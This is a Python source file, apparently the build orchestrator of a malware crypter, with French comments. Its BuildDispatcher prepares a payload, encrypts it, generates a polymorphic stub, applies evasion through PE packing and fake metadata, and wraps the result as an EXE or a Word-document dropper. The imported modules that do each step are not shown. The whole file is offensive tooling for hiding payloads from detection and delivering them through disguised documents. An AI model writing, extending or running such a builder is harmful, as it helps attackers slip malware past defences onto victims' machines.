import os
from datetime import datetime

from .logger import Logger
from modules.payloads.payload_preparer import PayloadPreparer
from modules.encryption.encryptor import EncryptionCoordinator
from modules.stub.stubgen import StubGenerator
from modules.evasion.pe_packer import PEPacker
from modules.evasion.metafaker import MetaFaker
from documents.word_dropper.generate_doc import WordDropperGenerator


class BuildDispatcher:
    def __init__(self, config, log_callback=None):
        self.config = config
        self.logger = Logger()
        self.log_callback = log_callback or print
        self.build_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.output_path = os.path.join(config['output_dir'], self.build_id)

    def log(self, message):
        """📣 Logger interne + callback GUI/CLI"""
        self.logger.log(message)
        if self.log_callback:
            self.log_callback(message)

    def build_all(self):
        """🔁 Pipeline complet de génération"""
        try:
            os.makedirs(self.output_path, exist_ok=True)

            self.log("📦 Phase 1 : Préparation du payload...")
            payload_data = self._prepare_payload()

            self.log("🔐 Phase 2 : Chiffrement des données...")
            encrypted_data, keys = self._encrypt_payload(payload_data)

            self.log("🧬 Phase 3 : Génération du stub polymorphe...")
            stub_path = self._generate_stub(encrypted_data, keys)

            self.log("🕵️ Phase 4 : Ajout des techniques d'évasion...")
            evaded_stub = self._apply_evasion(stub_path)

            self.log("📄 Phase 5 : Génération du format final...")
            final_output = self._generate_output(evaded_stub)

            self.log(f"✅ Build terminé : {final_output}")
            return True, final_output

        except Exception as e:
            self.log(f"❌ Build échoué : {e}")
            return False, None

    # === Phases internes ===

    def _prepare_payload(self):
        preparer = PayloadPreparer()
        return preparer.prepare(self.config['payload_path'])

    def _encrypt_payload(self, payload_data):
        coordinator = EncryptionCoordinator(self.config['encryption_method'])
        return coordinator.encrypt_payload(payload_data)

    def _generate_stub(self, encrypted_data, keys):
        stub_gen = StubGenerator(self.config['evasion_level'])
        return stub_gen.generate_stub(encrypted_data, keys, self.output_path)

    def _apply_evasion(self, stub_path):
        """🧪 PE packer + fake metadata selon niveau"""
        if self.config['evasion_level'] in ['High', 'Maximum']:
            packed = PEPacker().pack(stub_path)
            faked = MetaFaker().add_fake_metadata(packed)
            return faked
        return stub_path

    def _generate_output(self, final_stub):
        """📦 Génère le document ou retourne l'EXE final"""
        fmt = self.config.get('target_format', 'EXE')

        if fmt in ['Word', 'Word Document']:
            return WordDropperGenerator().generate(final_stub, self.output_path)

        # Ajoute ici les futurs formats (DLL, Excel, etc.)
        return final_stub
